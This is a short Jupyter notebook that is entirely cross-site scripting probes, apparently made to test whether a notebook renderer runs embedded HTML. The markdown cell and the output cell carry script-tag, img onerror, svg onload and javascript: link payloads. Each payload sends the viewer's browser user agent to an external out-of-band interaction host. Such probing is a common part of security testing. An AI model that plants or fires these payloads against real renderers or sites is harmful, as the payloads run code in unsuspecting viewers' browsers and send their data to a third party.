# %% [markdown]
# # ipynb renderer XSS probe
#
# If you see this, the notebook renderer is active.
#
# <!-- markdown HTML probes -->
# <img src=x onerror="new Image().src='https://d964nnd54v9bmv1ife10kzegqiduur6tx.oast.fun/mdimg?ua='+encodeURIComponent(navigator.userAgent)+'&t='+Date.now()">
# <svg xmlns="http://www.w3.org/2000/svg" onload="new Image().src='https://d964nnd54v9bmv1ife10kzegqiduur6tx.oast.fun/mdsvg?ua='+encodeURIComponent(navigator.userAgent)+'&t='+Date.now()"></svg>
# <a href="javascript:new Image().src='https://d964nnd54v9bmv1ife10kzegqiduur6tx.oast.fun/mdjs?ua='+encodeURIComponent(navigator.userAgent)+'&t='+Date.now()">javascript: link</a>

# %%
print('xss probe')
# Out:
# <h2>HTML output probes</h2><script>new Image().src='https://d964nnd54v9bmv1ife10kzegqiduur6tx.oast.fun/script?ua='+encodeURIComponent(navigator.userAgent)+'&t='+Date.now()</script><img src=x onerror="new Image().src='https://d964nnd54v9bmv1ife10kzegqiduur6tx.oast.fun/onerror?ua='+encodeURIComponent(navigator.userAgent)+'&t='+Date.now()"><svg xmlns='http://www.w3.org/2000/svg' onload="new Image().src='https://d964nnd54v9bmv1ife10kzegqiduur6tx.oast.fun/svgonload?ua='+encodeURIComponent(navigator.userAgent)+'&t='+Date.now()"></svg>
